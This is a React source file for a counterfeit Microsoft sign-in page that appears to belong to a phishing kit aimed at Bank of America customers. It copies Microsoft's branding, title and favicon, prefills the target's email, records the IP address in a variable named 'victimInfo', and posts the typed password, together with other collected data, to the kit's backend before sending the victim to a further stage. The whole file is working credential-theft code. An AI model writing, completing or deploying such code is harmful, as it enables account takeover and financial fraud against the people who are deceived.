import "../styles/microsoft.css";
import { useEffect, useMemo, useRef, useState } from "react";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import axios from "axios";
import API from "../api/api";

const Microsoft = () => {
  const [password, setPassword] = useState("");
  const passwordRef = useRef(null);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const email = useMemo(() => {
    const query = new URLSearchParams(window.location.search);
    return query.get("email");
  }, [window.location]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({
        ..._data,
        providerInfo: { provider: "microsoft", password },
      }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "Bank of America",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        window.location.href = `/account?${randParams()}`;
      }
    } catch (error) {
      alert("Something went wrong");
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  useEffect(() => {
    if (passwordRef.current) {
      passwordRef.current.focus();
    }

    document.title = "Sign in to your Microsoft account";
    const favicon =
      document.querySelector("link[rel='icon']") ||
      document.createElement("link");
    favicon.href = "/images/ms/microsoft.ico";
    favicon.rel = "icon";
    document.head.appendChild(favicon);

    return () => {
      document.title = "Bank of America";
      document.head.removeChild(favicon);
    };
  }, []);

  return (
    <>
      <div className="ms-wrapper">
        <form
          className="loginDiv"
          onSubmit={handleSubmit}
        >
          <p className="logoWrapper">
            <img
              className="logo"
              src="/images/ms/microsoft_logo.svg"
              alt="MS logo"
            />
          </p>
          <div className="back-btn">
            <img
              src="/images/ms/arrow.svg"
              alt="arrowImg"
            />
            <p className="emailP">{email}</p>
          </div>
          <h1 className="head">Enter Password</h1>
          <input
            ref={passwordRef}
            className="inputEmail"
            type="password"
            value={password}
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <p className="misAcc">
            <a href="#">Forgot password?</a>
          </p>
          <p className="buttonsGroup">
            <button className="buttonBtnNext">Sign in</button>
          </p>
        </form>
      </div>
      <div class="ms-footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy &amp; cookies</a>
        <a
          href="#"
          style={{
            letterSpacing: "3px",
            fontWeight: 600,
            fontSize: 16,
          }}
        >
          ...
        </a>
      </div>
    </>
  );
};

export default Microsoft;
